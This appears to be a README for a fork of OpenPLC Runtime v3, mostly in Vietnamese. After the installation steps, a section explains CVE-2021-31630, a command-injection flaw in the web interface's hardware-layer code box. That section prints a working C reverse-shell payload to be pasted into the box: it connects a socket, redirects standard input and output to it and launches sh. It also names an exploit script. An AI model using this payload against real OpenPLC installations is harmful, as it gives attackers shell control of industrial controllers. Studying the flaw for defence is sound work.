# OpenPLC Runtime version 3

## Giới thiệu
[![Build Status](https://travis-ci.org/tranquac/OpenPLC_v3.svg?branch=master)](https://travis-ci.org/tranquac/OpenPLC_v3)
[![Build status](https://ci.appveyor.com/api/projects/status/ut3466ixwtyf68qg?svg=true)](https://ci.appveyor.com/project/shrmrf/openplc-v3)

OpenPLC là một bộ điều khiển logic lập trình nguồn mở dựa trên phần mềm dễ sử dụng. Trọng tâm của chúng tôi là cung cấp một giải pháp công nghiệp chi phí thấp cho tự động hóa và nghiên cứu. OpenPLC đã được sử dụng trong nhiều bài báo nghiên cứu như một khuôn khổ cho nghiên cứu an ninh mạng công nghiệp, vì đây là bộ điều khiển duy nhất cung cấp toàn bộ mã nguồn. Dự án OpenPLC bao gồm ba dự án phụ:
1. [Runtime](https://github.com/tranquac/OpenPLC_v3)
2. [Programming editor](http://www.openplcproject.com/plcopen-editor)
3. [HMI builder](http://www.openplcproject.com/reference-installing-scadabr)

## Cài đặt
```bash
mkdir /opt/PLC
cd /opt/PLC
git clone https://github.com/tranquac/OpenPLC_v3.git
cd OpenPLC_v3
./install.sh [platform]
```

Where `[platform]` can be:

`win` - Install OpenPLC on Windows over Cygwin

`linux` - Install OpenPLC on a Debian-based Linux distribution

`docker` - Used by the `Dockerfile` (i.e. doesn't invoke `sudo`)

`rpi` - Install OpenPLC on a Raspberry Pi

`custom` - Skip all specific package installation and tries to install OpenPLC assuming your system already has all dependencies met. This option can be useful if you're trying to install OpenPLC on an unsuported Linux platform or had manually installed all the dependency packages before.

## CVE-2021-31630

CVE-2021-31630 là lỗ hổng thuộc dạng **code/command injection** trên WebServer của OpenPLC (phiên bản v3 được community sử dụng rộng). Lỗi nằm ở tính năng cho phép nạp/chỉnh sửa mã ở giao diện /hardware (Hardware Layer Code Box), nơi dữ liệu đầu vào không được lọc/sanitize đầy đủ trước khi được xử lý ở tầng server, dẫn tới khả năng thực thi mã dưới quyền chạy của tiến trình webserver. Lỗ hổng được công khai năm 2021 và có mức độ nghiêm trọng cao trên các cơ sở dữ liệu lỗ hổng công khai.

Mô tả kỹ thuật (mức defensible): giao diện web chấp nhận một đoạn "hardware layer code" do người dùng nhập. Đoạn dữ liệu này sau đó được xử lý bởi các thành phần server có khả năng biên dịch/chuẩn hóa hoặc đưa vào command context mà không thực hiện bước kiểm tra, lọc ký tự đặc biệt, hoặc ràng buộc chặt chẽ. Trong những điều kiện nhất định (ví dụ: dữ liệu được nối vào chuỗi lệnh hệ thống, hoặc truyền thẳng vào hàm xử lý code), kẻ tấn công có thể chèn các đoạn điều khiển gây thay đổi luồng thực thi.

```
#include "ladder.h"
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int ignored_bool_inputs[] = {-1};
int ignored_bool_outputs[] = {-1};
int ignored_int_inputs[] = {-1};
int ignored_int_outputs[] = {-1};

void initCustomLayer(){}

void updateCustomIn(){}

void updateCustomOut()
{
    int port = 1111;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("127.0.0.1");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"sh", NULL};
    execvp("sh", argv);

    return 0;       
}
```
Code khai thác: cve-2021-31630.py
